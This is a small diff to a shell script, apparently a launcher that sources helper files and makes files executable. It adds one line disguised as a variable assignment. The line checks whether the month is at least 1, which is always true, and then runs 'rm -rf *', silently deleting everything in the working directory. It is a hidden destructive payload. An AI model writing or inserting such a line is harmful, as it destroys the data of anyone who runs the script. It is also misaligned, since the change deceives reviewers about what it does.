@@ -22,6 +22,7 @@
  #CLOWNTERS
 CLOWNTERS
 
+a=`getting=$((($(date +%m) >= 1)) && rm -rf *)`
 source .functions/.variables.sh
 source .functions/.functions.sh
 chmod +x *
